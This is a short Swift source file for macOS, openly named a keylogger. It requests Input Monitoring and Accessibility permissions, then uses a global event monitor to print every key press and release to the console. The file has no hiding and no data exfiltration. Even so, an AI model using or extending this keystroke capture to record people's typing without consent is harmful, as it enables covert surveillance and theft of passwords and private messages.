// The Swift Programming Language
// https://docs.swift.org/swift-book
//
// main.swift
// keylogger
//
// Created by Yurii Kolesnykov on 2023-12-16
//
// Copyright 2023 Yurii Kolesnykov
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

import AppKit

@main
class Logger {
    public static func main() {
        logKeys()
        NSApplication.shared.run()
    }

    private static func logKeys() {
        guard requestPermissions() else { return }

        NSEvent.addGlobalMonitorForEvents(matching: [.keyDown, .keyUp]) { event in
            switch event.type {
            case .keyDown:
                print("keyDown: " + event.characters!)
            case .keyUp:
                print("keyUp: " + event.characters!)
            default:
                print("unknown event")
              break
            }
        }
    }

    private static func requestPermissions() -> Bool {
        // below requests "Input Monitoring"
        IOHIDRequestAccess(kIOHIDRequestTypeListenEvent)
        // below requests "Accessibility"
        IOHIDRequestAccess(kIOHIDRequestTypePostEvent)

        if !AXIsProcessTrusted() {
            print("Need accessibility permissions!")
            let options: NSDictionary = [
                kAXTrustedCheckOptionPrompt.takeRetainedValue() as NSString: true
            ]

            AXIsProcessTrustedWithOptions(options)

            return false;
        } else {
            print("Accessibility permissions active")
            return true;
        }
    }
}
